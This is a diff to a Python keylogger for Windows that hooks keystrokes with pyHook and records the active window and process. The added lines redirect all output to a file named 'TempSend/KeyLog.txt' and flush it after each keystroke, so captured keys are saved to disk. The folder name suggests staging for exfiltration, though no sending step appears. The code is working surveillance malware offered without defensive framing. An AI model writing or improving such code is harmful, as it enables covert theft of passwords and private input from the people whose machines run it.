@@ -3,12 +3,16 @@ from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
+import sys
   
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
-  
+
+f=open('./TempSend/KeyLog.txt','wb')
+sys.stdout = f
+
 #
 def get_current_process():
   
@@ -65,6 +69,7 @@ def KeyStroke(event):
         else:
             print "[%s]" % event.Key,
     # 循环监听下一个击键事件
+    f.flush()
     return True
   
 # 创建并注册hook管理器
